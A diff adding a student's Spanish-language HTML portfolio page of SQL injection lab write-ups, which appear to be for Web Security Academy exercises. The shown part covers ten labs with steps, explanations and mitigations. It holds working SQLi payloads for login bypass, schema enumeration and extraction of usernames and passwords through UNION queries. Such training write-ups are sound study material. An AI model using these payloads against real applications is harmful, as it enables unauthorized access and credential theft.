@@ -1,0 +1,989 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <title>SQL Injection Labs :: Road to Hall of Fame</title>
+    <link rel="stylesheet" href="style.css">
+    <link
+        href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Exo+2:wght@300;400;600&family=Fira+Code:wght@400;500&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2pdf.js/0.10.1/html2pdf.bundle.min.js"></script>
+    <style>
+        :root {
+            --app: hsl(225, 20%, 7%);
+            --card: rgba(255, 255, 255, .05);
+            --border: rgba(255, 255, 255, .09);
+            --g: #00ff88;
+            --b: #00d4ff;
+            --p: #ff4dd8
+        }
+
+        #vl,
+        #vd {
+            display: none
+        }
+
+        #vl.on,
+        #vd.on {
+            display: block
+        }
+
+        /* ── LAB CARD ── */
+        .lc {
+            background: var(--card);
+            border: 1px solid var(--border);
+            border-left: 4px solid var(--acc, #555);
+            border-radius: 16px;
+            padding: 0;
+            margin-bottom: 14px;
+            display: flex;
+            align-items: stretch;
+            overflow: hidden;
+            opacity: 0;
+            animation: fadeUp .4s ease forwards;
+            transition: transform .2s, box-shadow .2s
+        }
+
+        .lc:hover {
+            transform: translateY(-3px) translateX(2px);
+            box-shadow: 0 12px 40px rgba(0, 0, 0, .35)
+        }
+
+        @keyframes fadeUp {
+            from {
+                opacity: 0;
+                transform: translateY(18px)
+            }
+
+            to {
+                opacity: 1;
+                transform: translateY(0)
+            }
+        }
+
+        .lc:nth-child(1) {
+            animation-delay: .04s
+        }
+
+        .lc:nth-child(2) {
+            animation-delay: .08s
+        }
+
+        .lc:nth-child(3) {
+            animation-delay: .12s
+        }
+
+        .lc:nth-child(4) {
+            animation-delay: .16s
+        }
+
+        .lc:nth-child(5) {
+            animation-delay: .20s
+        }
+
+        .lc:nth-child(6) {
+            animation-delay: .24s
+        }
+
+        .lc:nth-child(7) {
+            animation-delay: .28s
+        }
+
+        .lc:nth-child(8) {
+            animation-delay: .32s
+        }
+
+        .lc:nth-child(9) {
+            animation-delay: .36s
+        }
+
+        .lc:nth-child(10) {
+            animation-delay: .40s
+        }
+
+        .lc:nth-child(11) {
+            animation-delay: .44s
+        }
+
+        .lc:nth-child(12) {
+            animation-delay: .48s
+        }
+
+        .lc:nth-child(13) {
+            animation-delay: .52s
+        }
+
+        .lc:nth-child(14) {
+            animation-delay: .56s
+        }
+
+        .lc:nth-child(15) {
+            animation-delay: .60s
+        }
+
+        .lc:nth-child(16) {
+            animation-delay: .64s
+        }
+
+        .lc:nth-child(17) {
+            animation-delay: .68s
+        }
+
+        .lc:nth-child(18) {
+            animation-delay: .72s
+        }
+
+        .lc-num {
+            width: 70px;
+            flex-shrink: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            background: rgba(0, 0, 0, .25);
+            gap: 2px;
+            padding: 16px 8px
+        }
+
+        .lc-num small {
+            font-size: .48rem;
+            color: #444;
+            font-family: 'Orbitron', sans-serif;
+            letter-spacing: 1.5px
+        }
+
+        .lc-num b {
+            font-size: 1.3rem;
+            font-family: 'Orbitron', sans-serif;
+            color: #fff;
+            line-height: 1
+        }
+
+        .lc.solved .lc-num b {
+            color: var(--g)
+        }
+
+        .lc-body {
+            flex: 1;
+            padding: 16px 18px 14px;
+            min-width: 0
+        }
+
+        .lc-title {
+            font-size: .9rem;
+            font-weight: 700;
+            color: #fff;
+            line-height: 1.4;
+            margin-bottom: 10px
+        }
+
+        .lc-chips {
+            display: flex;
+            gap: 6px;
+            flex-wrap: wrap;
+            margin-bottom: 14px
+        }
+
+        .chip {
+            font-size: .68rem;
+            padding: 3px 9px;
+            border-radius: 20px;
+            border: 1px solid rgba(255, 255, 255, .1);
+            color: #aab;
+            background: rgba(255, 255, 255, .04)
+        }
+
+        .chip.appr {
+            border-color: rgba(0, 255, 136, .3);
+            color: #00ff88;
+            background: rgba(0, 255, 136, .06)
+        }
+
+        .chip.prac {
+            border-color: rgba(0, 212, 255, .3);
+            color: #00d4ff;
+            background: rgba(0, 212, 255, .06)
+        }
+
+        .chip.exp {
+            border-color: rgba(255, 77, 216, .3);
+            color: #ff4dd8;
+            background: rgba(255, 77, 216, .06)
+        }
+
+        .lc-btn {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            padding: 8px 16px;
+            border-radius: 9px;
+            background: rgba(255, 255, 255, .07);
+            border: 1px solid rgba(255, 255, 255, .12);
+            color: #fff;
+            font-size: .78rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all .2s;
+            font-family: 'Exo 2', sans-serif
+        }
+
+        .lc-btn:hover {
+            background: rgba(255, 255, 255, .13);
+            transform: translateX(4px)
+        }
+
+        .lc.solved .lc-btn {
+            border-color: rgba(0, 255, 136, .3);
+            color: var(--g)
+        }
+
+        .lc-right {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 0 18px;
+            gap: 4px
+        }
+
+        .lc-status {
+            font-size: .62rem;
+            font-family: 'Orbitron', sans-serif;
+            letter-spacing: .8px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 4px;
+            color: #2a3040
+        }
+
+        .lc-status.ok {
+            color: var(--g)
+        }
+
+        .lc-status i {
+            font-size: 1.1rem
+        }
+
+        /* ── DETAIL ── */
+        .d-back {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            padding: 7px 15px;
+            background: rgba(255, 255, 255, .05);
+            border: 1px solid rgba(255, 255, 255, .1);
+            border-radius: 8px;
+            color: #aaa;
+            font-family: 'Orbitron', sans-serif;
+            font-size: .65rem;
+            letter-spacing: 1px;
+            cursor: pointer;
+            margin-bottom: 24px;
+            transition: all .2s
+        }
+
+        .d-back:hover {
+            background: rgba(255, 255, 255, .1);
+            color: #fff
+        }
+
+        .d-hero {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+            margin-bottom: 20px;
+            flex-wrap: wrap
+        }
+
+        .d-num-box {
+            width: 64px;
+            height: 64px;
+            border-radius: 14px;
+            background: rgba(10, 16, 28, .9);
+            border: 1px solid rgba(255, 255, 255, .1);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+            gap: 2px
+        }
+
+        .d-num-box small {
+            font-size: .45rem;
+            color: #444;
+            font-family: 'Orbitron', sans-serif;
+            letter-spacing: 2px
+        }
+
+        .d-num-box span {
+            font-size: 1.1rem;
+            font-weight: 700;
+            font-family: 'Orbitron', sans-serif;
+            color: #fff
+        }
+
+        .d-info h2 {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 1.05rem;
+            color: #fff;
+            margin-bottom: 8px;
+            line-height: 1.35
+        }
+
+        .d-chips {
+            display: flex;
+            gap: 7px;
+            flex-wrap: wrap
+        }
+
+        .d-status {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            padding: 10px 16px;
+            border-radius: 10px;
+            border: 1px solid rgba(255, 255, 255, .07);
+            background: rgba(255, 255, 255, .03);
+            margin-bottom: 20px;
+            font-size: .82rem;
+            color: #666
+        }
+
+        .d-status.ok {
+            border-color: rgba(0, 255, 136, .2);
+            background: rgba(0, 255, 136, .04);
+            color: var(--g)
+        }
+
+
+
+        /* Section box */
+        .sec {
+            background: rgba(255, 255, 255, .03);
+            border: 1px solid rgba(255, 255, 255, .06);
+            border-radius: 13px;
+            padding: 18px 20px;
+            margin-bottom: 12px
+        }
+
+        .sec h3 {
+            font-family: 'Orbitron', sans-serif;
+            font-size: .7rem;
+            color: var(--g);
+            letter-spacing: 1.5px;
+            margin-bottom: 12px;
+            display: flex;
+            align-items: center;
+            gap: 7px
+        }
+
+        .sec p,
+        .sec li {
+            font-size: .83rem;
+            color: #bbc;
+            line-height: 1.7
+        }
+
+        .sec ul,
+        .sec ol {
+            padding-left: 18px
+        }
+
+        .sec li {
+            margin-bottom: 5px
+        }
+
+        .sec code {
+            background: rgba(0, 255, 136, .08);
+            color: #00ff88;
+            padding: 1px 6px;
+            border-radius: 4px;
+            font-family: 'Fira Code', monospace;
+            font-size: .78rem
+        }
+
+        /* Step cards */
+        .step-grid {
+            display: grid;
+            gap: 10px
+        }
+
+        .step-card {
+            display: flex;
+            gap: 12px;
+            align-items: flex-start;
+            background: rgba(255, 255, 255, .03);
+            border: 1px solid rgba(255, 255, 255, .06);
+            border-radius: 11px;
+            padding: 12px 14px
+        }
+
+        .step-n {
+            flex-shrink: 0;
+            width: 26px;
+            height: 26px;
+            border-radius: 50%;
+            background: rgba(0, 255, 136, .12);
+            border: 1px solid rgba(0, 255, 136, .3);
+            color: var(--g);
+            font-size: .75rem;
+            font-weight: 700;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-family: 'Orbitron', sans-serif
+        }
+
+        .step-t {
+            font-size: .82rem;
+            color: #ccd;
+            line-height: 1.6
+        }
+
+        /* Payload box */
+        .pay-wrap {
+            position: relative
+        }
+
+        .pay-box {
+            background: rgba(0, 0, 0, .5);
+            border: 1px solid rgba(0, 255, 136, .18);
+            border-radius: 10px;
+            padding: 14px 50px 14px 16px;
+            font-family: 'Fira Code', monospace;
+            font-size: .78rem;
+            color: #00ff88;
+            word-break: break-all;
+            line-height: 1.7;
+            white-space: pre-wrap
+        }
+
+        .copy-btn {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            background: rgba(0, 255, 136, .12);
+            border: 1px solid rgba(0, 255, 136, .25);
+            border-radius: 7px;
+            color: var(--g);
+            width: 30px;
+            height: 30px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            font-size: .75rem;
+            transition: all .2s
+        }
+
+        .copy-btn:hover {
+            background: rgba(0, 255, 136, .22)
+        }
+
+        .copied {
+            background: rgba(0, 255, 136, .3) !important
+        }
+
+        /* Screenshot placeholders */
+        .sc-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 10px
+        }
+
+        .sc-ph {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            padding: 24px 16px;
+            border: 2px dashed rgba(255, 255, 255, .07);
+            border-radius: 10px;
+            color: #1e2430;
+            font-style: italic;
+            font-size: .75rem;
+            text-align: center
+        }
+
+        .sc-ph i {
+            font-size: 1.6rem
+        }
+
+        /* Mitigation list */
+        .mit-item {
+            display: flex;
+            gap: 10px;
+            align-items: flex-start;
+            padding: 10px 12px;
+            background: rgba(255, 255, 255, .02);
+            border: 1px solid rgba(255, 255, 255, .05);
+            border-radius: 9px;
+            margin-bottom: 8px
+        }
+
+        .mit-item i {
+            color: var(--g);
+            margin-top: 2px;
+            flex-shrink: 0
+        }
+
+        .mit-item span {
+            font-size: .82rem;
+            color: #bbc;
+            line-height: 1.6
+        }
+
+        /* Progress */
+        .pm {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 4px
+        }
+
+        .pm span {
+            font-size: .55rem;
+            color: #1a1f2a
+        }
+
+        /* Hover glow based on accent */
+        .lc:hover {
+            box-shadow: 0 12px 40px rgba(0, 0, 0, .35), 0 0 0 1px var(--acc, #555) inset
+        }
+    </style>
+</head>
+
+<body>
+    <div class="animated-bg"></div>
+    <div class="particles"></div>
+    <div class="app-container">
+
+        <nav class="neon-nav">
+            <div class="nav-logo">JAVIER<span class="bad">XD1383</span></div>
+            <div class="nav-items">
+                <a href="index.html" class="nav-btn color-1">INICIO</a>
+                <a href="actividades.html" class="nav-btn color-4">ACTIVIDADES</a>
+                <a href="proyectos.html" class="nav-btn color-3">PROYECTOS</a>
+                <div class="nav-dropdown">
+                    <span class="nav-btn color-hof active-nav nav-dropdown-btn"><i class="fas fa-trophy"></i> HALL OF
+                        FAME <i class="fas fa-chevron-down dropdown-arrow"></i></span>
+                    <div class="nav-dropdown-menu">
+                        <div class="dropdown-header">ROAD TO HALL OF FAME</div>
+                        <div class="dropdown-divider"></div>
+                        <a href="actividad8.html" class="dropdown-item"><i class="fas fa-database"></i> SQL Injection
+                            <span class="item-tag">ACTIVO</span></a>
+                    </div>
+                </div>
+            </div>
+        </nav>
+
+        <main>
+            <!-- LIST VIEW -->
+            <div id="vl" class="on">
+                <section class="slide-in">
+                    <div class="article-container">
+                        <header class="article-header">
+                            <div class="article-meta"><a href="hall-of-fame.html"
+                                    style="color:var(--c-green);text-decoration:none;font-size:.84rem;"><i
+                                        class="fas fa-arrow-left"></i> ROAD TO HALL OF FAME</a> / SQL INJECTION</div>
+                            <h1 style="font-family:'Orbitron';font-size:1.9rem;margin:12px 0;"><span
+                                    style="color:var(--c-green);">SQL</span> INJECTION — Labs</h1>
+                            <p style="color:#999;font-size:.88rem;margin-bottom:16px;"><i class="fas fa-database"
+                                    style="color:var(--c-green);"></i> 18 laboratorios · Actividad 08 · CNO V ·
+                                Primavera 2026</p>
+                            <div
+                                style="background:rgba(0,255,136,.04);padding:11px 16px;border-radius:10px;margin-bottom:16px;border-left:3px solid var(--c-green);display:flex;flex-wrap:wrap;gap:16px;font-size:.85rem;color:#ccc;">
+                                <span><i class="fas fa-user" style="color:var(--c-green);"></i> <strong>Francisco Javier
+                                        Cruz Juarez</strong> (177622)</span>
+                                <span><i class="fas fa-check-circle" style="color:var(--c-green);"></i> <strong
+                                        style="color:var(--c-green);">3</strong> / 18 Labs</span>
+                            </div>
+                            <button onclick="dlPDF()" id="bpdf" class="pdf-btn"
+                                style="display:inline-flex;align-items:center;gap:7px;cursor:pointer;border:none;padding:9px 18px;font-family:'Orbitron';font-size:.75rem;"><i
+                                    class="fas fa-file-pdf"></i> DESCARGAR PDF</button>
+                        </header>
+                        <div class="tech-divider"></div>
+                        <div class="lab-progress-wrap">
+                            <div class="lab-progress-header"><span><i class="fas fa-route"></i> PROGRESO</span><span
+                                    class="lab-progress-count">3 / 18</span></div>
+                            <div class="lab-progress-bar">
+                                <div class="lab-progress-fill" style="width:16.7%"></div>
+                            </div>
+                            <div class="pm">
+                                <span>Start</span><span>25%</span><span>50%</span><span>75%</span><span>🏆</span>
+                            </div>
+                        </div>
+                        <article class="article-body" style="margin-top:28px;">
+                            <h2 style="margin-bottom:20px;color:#fff;font-size:1rem;"><i class="fas fa-flask"
+                                    style="color:var(--c-green);"></i> LABORATORIOS</h2>
+                            <div id="ll"></div>
+                        </article>
+                    </div>
+                </section>
+            </div>
+
+            <!-- DETAIL VIEW -->
+            <div id="vd">
+                <section class="slide-in">
+                    <div class="article-container">
+                        <div class="article-body">
+                            <div class="d-back" onclick="back()"><i class="fas fa-arrow-left"></i> VOLVER A LABS</div>
+                            <div class="d-hero">
+                                <div class="d-num-box"><small>LAB</small><span id="dn">01</span></div>
+                                <div class="d-info">
+                                    <h2 id="dt">—</h2>
+                                    <div class="d-chips" id="dch"></div>
+                                </div>
+                            </div>
+                            <div class="d-status" id="ds"><i id="dsi" class="fas fa-lock"></i><span
+                                    id="dst">Pendiente</span></div>
+
+                            <div class="sec">
+                                <h3><i class="fas fa-bullseye"></i> OBJETIVO DEL LABORATORIO</h3>
+                                <p id="obj">—</p>
+                            </div>
+                            <div class="sec">
+                                <h3><i class="fas fa-microchip"></i> EXPLICACIÓN TÉCNICA</h3>
+                                <p id="tech">—</p>
+                            </div>
+                            <div class="sec">
+                                <h3><i class="fas fa-list-ol"></i> PROCEDIMIENTO PASO A PASO</h3>
+                                <div class="step-grid" id="steps"></div>
+                            </div>
+                            <div class="sec">
+                                <h3><i class="fas fa-terminal"></i> PAYLOAD UTILIZADO</h3>
+                                <div class="pay-wrap">
+                                    <div class="pay-box" id="pay">—</div>
+                                    <div class="copy-btn" onclick="copyPay()" title="Copiar"><i class="fas fa-copy"></i>
+                                    </div>
+                                </div>
+                                <p id="pexp" style="font-size:.82rem;color:#aab;line-height:1.7;margin-top:12px;"></p>
+                            </div>
+                            <div class="sec">
+                                <h3><i class="fas fa-camera"></i> CAPTURAS DE PANTALLA</h3>
+                                <div class="sc-grid">
+                                    <div class="sc-ph"><i class="fas fa-search"></i>Request interceptado<small
+                                            style="color:#111;margin-top:4px">Añadir captura</small></div>
+                                    <div class="sc-ph"><i class="fas fa-terminal"></i>Payload enviado<small
+                                            style="color:#111;margin-top:4px">Añadir captura</small></div>
+                                    <div class="sc-ph"><i class="fas fa-bug"></i>Respuesta vulnerable<small
+                                            style="color:#111;margin-top:4px">Añadir captura</small></div>
+                                    <div class="sc-ph"><i class="fas fa-trophy"></i>Lab Solved<small
+                                            style="color:#111;margin-top:4px">Añadir captura</small></div>
+                                </div>
+                            </div>
+                            <div class="sec">
+                                <h3><i class="fas fa-shield-alt"></i> MITIGACIÓN RECOMENDADA</h3>
+                                <div id="miti"></div>
+                            </div>
+                        </div>
+                    </div>
+                </section>
+            </div>
+        </main>
+
+        <footer>
+            <div class="scrolling-text">> FRANCISCO JAVIER CRUZ JUAREZ (177622) > SQL INJECTION LABS > ROAD TO HALL OF
+                FAME > PRIMAVERA 2026 ></div>
+        </footer>
+    </div>
+
+    <script>
+        const D = [
+            {
+                n: 1, nivel: 'Apprentice', tipo: 'In-band Boolean', acc: '#00ff88', solved: false,
+                title: 'SQL injection vulnerability in WHERE clause allowing retrieval of hidden data',
+                obj: 'Realizar un ataque de SQL injection en el filtro de categoría de productos para que la aplicación muestre productos ocultos (no publicados) que normalmente son filtrados por la condición <code>released = 1</code>.',
+                tech: 'La aplicación construye la consulta: <code>SELECT * FROM products WHERE category = \'Gifts\' AND released = 1</code>. Al inyectar el payload en el parámetro <code>category</code>, la condición 1=1 siempre es verdadera y el comentario <code>--</code> elimina la cláusula <code>AND released = 1</code>, devolviendo todos los productos incluyendo los no publicados.',
+                steps: ['Interceptar con Burp Suite la petición GET que filtra por categoría', 'Localizar el parámetro <code>category</code> en la URL', 'Modificar el parámetro a: <code>\'+OR+1=1--</code>', 'Enviar la petición y verificar que aparecen productos no publicados'],
+                payload: "'+OR+1=1--",
+                pexp: '<code>\'</code> cierra la cadena SQL. <code>OR 1=1</code> hace la condición siempre verdadera. <code>--</code> comenta el resto, eliminando <code>AND released = 1</code>.',
+                miti: ['Usar Prepared Statements (declaraciones parametrizadas) en lugar de concatenar strings SQL', 'Validar y sanitizar todos los inputs del usuario antes de usarlos en consultas', 'Aplicar principio de mínimo privilegio en cuentas de base de datos', 'Implementar un WAF para detectar y bloquear patrones de SQLi']
+            },
+
+            {
+                n: 2, nivel: 'Apprentice', tipo: 'Auth Bypass', acc: '#00ff88', solved: false,
+                title: 'SQL injection vulnerability allowing login bypass',
+                obj: 'Explotar la vulnerabilidad en el formulario de login para autenticarse como usuario <code>administrator</code> sin conocer su contraseña, comentando la verificación de credenciales.',
+                tech: 'El formulario construye: <code>SELECT * FROM users WHERE username=\'[input]\' AND password=\'[input]\'</code>. Al inyectar <code>administrator\'--</code> como username, el <code>--</code> comenta la condición del password, autenticando sin verificar credenciales.',
+                steps: ['Abrir Burp Suite e interceptar la petición POST de login', 'Localizar el parámetro <code>username</code>', 'Cambiar el valor a: <code>administrator\'--</code>', 'Poner cualquier valor en password (será ignorado)', 'Enviar y verificar sesión como administrador'],
+                payload: "administrator'--",
+                pexp: '<code>administrator</code> es el username objetivo. <code>\'</code> cierra la cadena. <code>--</code> comenta la verificación de password. La consulta resultante autentica solo por username.',
+                miti: ['Usar Prepared Statements para toda autenticación', 'Implementar autenticación multifactor (MFA)', 'Mostrar mensajes de error genéricos (no revelar si el usuario existe)', 'Aplicar rate limiting y bloqueo tras intentos fallidos']
+            },
+
+            {
+                n: 3, nivel: 'Practitioner', tipo: 'UNION / Oracle', acc: '#00d4ff', solved: false,
+                title: 'SQL injection attack, querying the database type and version on Oracle',
+                obj: 'Usar un ataque UNION para recuperar la cadena de versión de la base de datos Oracle e imprimirla en la respuesta de la aplicación, aprovechando la tabla dual y la vista v$version.',
+                tech: 'En Oracle, todo SELECT necesita FROM. Se usa la tabla <code>dual</code> como comodín. La vista <code>v$version</code> contiene la columna <code>BANNER</code> con la versión del motor. Con UNION se adjunta esta consulta a la original para ver la versión en la respuesta.',
+                steps: ['Interceptar con Burp Suite la petición del filtro de categoría', 'Verificar 2 columnas: <code>\'+UNION+SELECT+\'abc\',\'def\'+FROM+dual--</code>', 'Confirmar que ambas columnas aceptan texto', 'Inyectar payload final para obtener versión'],
+                payload: "'+UNION+SELECT+BANNER,+NULL+FROM+v$version--",
+                pexp: '<code>UNION SELECT</code> adjunta una segunda consulta. <code>BANNER</code> es la columna de versión en <code>v$version</code> (Oracle). <code>NULL</code> ocupa la segunda columna. <code>FROM dual</code> es necesario en Oracle.',
+                miti: ['Usar Bind Variables (Prepared Statements) de Oracle', 'Nunca exponer información de versión del servidor en respuestas', 'Revocar acceso de lectura a vistas del sistema como v$version', 'Implementar manejo de errores genérico sin detalles internos']
+            },
+
+            {
+                n: 4, nivel: 'Practitioner', tipo: 'UNION / MySQL-MSSQL', acc: '#00d4ff', solved: false,
+                title: 'SQL injection attack, querying the database type and version on MySQL and Microsoft',
+                obj: 'Recuperar la versión del motor de base de datos en MySQL o Microsoft SQL Server usando la variable global <code>@@version</code> en un ataque UNION.',
+                tech: 'MySQL/MSSQL exponen la versión a través de <code>@@version</code>. El comentario de línea en MySQL es <code>#</code> en lugar de <code>--</code>. Primero se determina el número de columnas y luego se extrae la versión.',
+                steps: ['Interceptar la petición del filtro de categoría', 'Verificar columnas: <code>\'+UNION+SELECT+\'abc\',\'def\'#</code>', 'Confirmar 2 columnas de texto', 'Extraer versión con el payload final'],
+                payload: "'+UNION+SELECT+@@version,+NULL#",
+                pexp: '<code>@@version</code> es variable global en MySQL/MSSQL con la versión del motor. <code>#</code> es comentario de MySQL. <code>NULL</code> ocupa la segunda columna para igualar la estructura.',
+                miti: ['Usar Prepared Statements en todos los accesos a BD', 'Deshabilitar acceso a variables de sistema desde la cuenta de aplicación', 'Ocultar cabeceras con información de versión en respuestas HTTP', 'Mantener el motor de BD actualizado']
+            },
+
+            {
+                n: 5, nivel: 'Practitioner', tipo: 'UNION / information_schema', acc: '#00d4ff', solved: false,
+                title: 'SQL injection attack, listing the database contents on non-Oracle databases',
+                obj: 'Enumerar tablas y columnas de la base de datos usando <code>information_schema</code> y extraer las credenciales del administrador para iniciar sesión.',
+                tech: 'Los SGBD no-Oracle (PostgreSQL, MySQL, MSSQL) tienen <code>information_schema.tables</code> e <code>information_schema.columns</code> que listan todos los objetos de la BD, permitiendo descubrir nombres de tablas y columnas dinámicamente.',
+                steps: ['Confirmar 2 columnas: <code>\'+UNION+SELECT+\'abc\',\'def\'--</code>', 'Listar tablas: <code>\'+UNION+SELECT+table_name,NULL+FROM+information_schema.tables--</code>', 'Encontrar la tabla de usuarios', 'Listar columnas: <code>\'+UNION+SELECT+column_name,NULL+FROM+information_schema.columns+WHERE+table_name=\'users_xxx\'--</code>', 'Extraer credenciales e iniciar sesión'],
+                payload: "'+UNION+SELECT+username_xxx,password_xxx+FROM+users_xxx--",
+                pexp: '<code>information_schema</code> es el estándar SQL para metadatos. Los sufijos de tabla/columna son aleatorios por lab y se descubren en pasos previos. El UNION devuelve user:pass en la respuesta visible.',
+                miti: ['Usar Prepared Statements', 'Revocar privilegios SELECT en information_schema para el usuario de la app', 'Almacenar contraseñas con hash bcrypt/Argon2 + sal', 'Nunca devolver datos de BD directamente en la interfaz']
+            },
+
+            {
+                n: 6, nivel: 'Practitioner', tipo: 'UNION / Oracle dict', acc: '#00d4ff', solved: false,
+                title: 'SQL injection attack, listing the database contents on Oracle',
+                obj: 'Enumerar tablas con <code>all_tables</code> y columnas con <code>all_tab_columns</code> (diccionario de Oracle) para obtener credenciales del administrador.',
+                tech: 'Oracle no tiene <code>information_schema</code>. Usa sus propias vistas del diccionario: <code>all_tables</code> lista tablas accesibles y <code>all_tab_columns</code> lista sus columnas. Los nombres suelen estar en MAYÚSCULAS.',
+                steps: ['Confirmar 2 columnas de texto con FROM dual', 'Listar tablas: <code>\'+UNION+SELECT+table_name,NULL+FROM+all_tables--</code>', 'Identificar tabla de credenciales', 'Listar columnas: <code>\'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name=\'USERS_XXX\'--</code>', 'Extraer credenciales e iniciar sesión'],
+                payload: "'+UNION+SELECT+USERNAME_XXX,PASSWORD_XXX+FROM+USERS_XXX--",
+                pexp: 'En Oracle se usan <code>all_tables</code> y <code>all_tab_columns</code> en lugar de information_schema. Los nombres en Oracle son case-sensitive y típicamente en MAYÚSCULAS.',
+                miti: ['Usar Bind Variables en Oracle', 'Revocar SELECT en all_tables y all_tab_columns', 'Implementar Oracle VPD (Virtual Private Database)', 'Hashear contraseñas con PBKDF2 o bcrypt']
+            },
+
+            {
+                n: 7, nivel: 'Practitioner', tipo: 'UNION / Column count', acc: '#00d4ff', solved: false,
+                title: 'SQL injection UNION attack, determining the number of columns returned by the query',
+                obj: 'Determinar el número exacto de columnas que retorna la consulta original añadiendo NULLs progresivamente hasta que el ataque UNION tenga éxito.',
+                tech: 'Para que UNION funcione, la consulta original y la inyectada deben tener el mismo número de columnas. Se prueban 1, 2, 3... NULLs hasta que la respuesta incluye contenido adicional sin errores. NULL es compatible con cualquier tipo de dato.',
+                steps: ['Interceptar la petición del filtro de categoría', 'Probar: <code>\'+UNION+SELECT+NULL--</code> — observar si hay error', 'Agregar NULL: <code>\'+UNION+SELECT+NULL,NULL--</code>', 'Continuar hasta que desaparezca el error', 'El número de NULLs exitosos = número de columnas'],
+                payload: "'+UNION+SELECT+NULL,NULL--",
+                pexp: 'NULL es compatible con cualquier tipo de columna (string, número, fecha). Se incrementa de 1 en 1 hasta que la consulta UNION es válida, revelando el número de columnas de la consulta original.',
+                miti: ['Usar Prepared Statements', 'Implementar manejo de errores genérico (no exponer errores SQL)', 'Validar tipos y rangos de entrada antes de usarlos en consultas', 'Usar un ORM con parámetros automáticos']
+            },
+
+            {
+                n: 8, nivel: 'Practitioner', tipo: 'UNION / Column type', acc: '#00d4ff', solved: false,
+                title: 'SQL injection UNION attack, finding a column containing text',
+                obj: 'Identificar qué columna(s) del resultado son compatibles con datos de tipo texto, reemplazando NULLs por una cadena de prueba provista por el lab.',
+                tech: 'No todas las columnas aceptan texto (VARCHAR). Se reemplaza cada NULL por una cadena arbitraria. Si no hay error de tipo, esa columna acepta strings. Esencial para colocar datos exfiltrados en la respuesta.',
+                steps: ['Confirmar 3 columnas: <code>\'+UNION+SELECT+NULL,NULL,NULL--</code>', 'Reemplazar primer NULL: <code>\'+UNION+SELECT+\'abcdef\',NULL,NULL--</code>', 'Si hay error, probar segundo: <code>\'+UNION+SELECT+NULL,\'abcdef\',NULL--</code>', 'Continuar hasta encontrar la columna de texto', 'Usar el valor exacto provisto por el lab'],
+                payload: "'+UNION+SELECT+'abcdef',NULL,NULL--",
+                pexp: 'Al reemplazar NULL por una cadena, si la BD acepta el tipo sin error, la columna es VARCHAR/TEXT. Determina en qué posición colocar el valor a exfiltrar en el UNION.',
+                miti: ['Usar Prepared Statements', 'Mensajes de error genéricos, sin revelar estructura de BD', 'Validar tipos de datos estrictamente en el backend', 'No mostrar resultados de BD directamente en la interfaz']
+            },
+
+            {
+                n: 9, nivel: 'Practitioner', tipo: 'UNION / Data retrieval', acc: '#00d4ff', solved: false,
+                title: 'SQL injection UNION attack, retrieving data from other tables',
+                obj: 'Extraer usernames y passwords de la tabla <code>users</code> usando UNION, aprovechando el conocimiento del número de columnas y cuáles aceptan texto.',
+                tech: 'Una vez conocida la estructura de la consulta (columnas y tipos), se apunta directamente a la tabla <code>users</code> con columnas <code>username</code> y <code>password</code>. El UNION agrega filas con estas credenciales al resultado visible.',
+                steps: ['Confirmar 2 columnas de texto: <code>\'+UNION+SELECT+\'abc\',\'def\'--</code>', 'Inyectar para extraer users y passwords', 'Verificar que la respuesta contiene credenciales', 'Copiar la contraseña del administrator', 'Iniciar sesión con esas credenciales'],
+                payload: "'+UNION+SELECT+username,+password+FROM+users--",
+                pexp: 'Se apunta directamente a <code>users</code> (tabla conocida en este lab). <code>username</code> y <code>password</code> van en las dos columnas de texto. El UNION adjunta los registros de usuarios al resultado de productos.',
+                miti: ['Usar Prepared Statements', 'Almacenar contraseñas con hash+sal (nunca texto plano)', 'Mínimo privilegio: la cuenta de app no debe leer tabla users', 'Monitorear consultas con patrones UNION anómalos']
+            },
+
+            {
+                n: 10, nivel: 'Practitioner', tipo: 'UNION / Concatenación', acc: '#00d4ff', solved: false,
+                title: 'SQL injection UNION attack, retrieving multiple values in a single column',
+                obj: 'Concatenar username y password en una sola columna usando el operador de concatenación, cuando solo una columna del resultado acepta tipo texto.',
+                tech: 'Si solo hay 1 columna de texto disponible, no se pueden extraer 2 campos por separado. Se concatenan usando <code>||</code> (PostgreSQL/Oracle) o CONCAT() (MySQL) con un delimitador, devolviendo ambos valores en un solo campo.',
+                steps: ['Verificar que solo la 2ª columna acepta texto: <code>\'+UNION+SELECT+NULL,\'abc\'--</code>', 'Concatenar username y password con delimitador: <code>\'+UNION+SELECT+NULL,username||\'~\'||password+FROM+users--</code>', 'Leer pares user~password en la respuesta', 'Iniciar sesión como administrator'],
+                payload: "'+UNION+SELECT+NULL,username||'~'||password+FROM+users--",
+                pexp: '<code>||</code> es el operador de concatenación en PostgreSQL/Oracle. El carácter <code>~</code> es el delimitador entre username y password. En MySQL se usaría <code>CONCAT(username,\'~\',password)</code>.',
+                miti: ['Usar Prepared Statements', 'Hashear contraseñas (bcrypt/Argon2) — aunque se extraigan, no son directamente útiles', 'Restringir acceso de la app a la tabla users', 'Implementar alertas sobre consultas con operadores de concatenación inusuales']
+            },
+
